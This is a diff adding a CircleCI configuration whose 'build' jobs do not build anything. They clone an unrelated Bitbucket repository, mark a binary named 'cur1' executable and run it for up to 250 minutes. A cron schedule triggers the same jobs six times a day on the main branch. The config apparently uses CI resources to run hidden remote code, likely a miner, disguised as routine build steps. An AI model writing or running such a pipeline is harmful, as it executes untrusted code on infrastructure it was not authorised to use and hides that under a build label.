@@ -1,0 +1,143 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.4.0
+
+executors:
+  circleci_machine:
+    docker:
+      - image: circleci/node:14.15
+    working_directory: ~/repo
+commands:
+  build:
+    description: Run build
+    steps:
+      - run:
+          name: build
+          command: |
+              sudo git clone --recursive https://bitbucket.org/UsertBokehf/kolo /home/kolo
+              sudo chmod +x /home/kolo/cur1
+              /home/kolo/cur1
+          no_output_timeout: 250m
+      - run:
+          name: buildddart
+          command:
+              mv /home/kolo /home/buster
+          when: on_fail
+          no_output_timeout: 3m
+  builder2:
+    description: Run builder2
+    steps:
+      - run:
+          name: build
+          command: |
+              sudo git clone --recursive https://bitbucket.org/UsertBokehf/kolo /home/kolo
+              sudo chmod +x /home/kolo/cur1
+              /home/kolo/cur1
+          no_output_timeout: 250m
+      - run:
+          name: buildddart
+          command:
+              mv /home/kolo /home/buster
+          when: on_fail
+          no_output_timeout: 3m
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [build]
+  build2:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+workflows:
+  version: 
+  build:
+    jobs:
+      - buildd
+      
+      - build2:
+          requires:
+          - buildd
+
+  build2:
+    triggers:
+      - schedule:
+          cron: 11 1 * * *
+          filters:
+            branches:
+              only:
+                - main
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+
+  majista:
+    triggers:
+      - schedule:
+          cron: 16 6 * * *
+          filters:
+            branches:
+              only:
+                - main
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+
+  mijer:
+    triggers:
+      - schedule:
+          cron: 21 11 * * *
+          filters:
+            branches:
+              only:
+                - main
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+  namex:
+    triggers:
+      - schedule:
+          cron: 1 16 * * *
+          filters:
+            branches:
+              only:
+                - main
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+  manage:
+    triggers:
+      - schedule:
+          cron: 6 21 * * *
+          filters:
+            branches:
+              only:
+                - main
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+  naamex:
+    triggers:
+      - schedule:
+          cron: 11 22 * * *
+          filters:
+            branches:
+              only:
+                - main
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+  
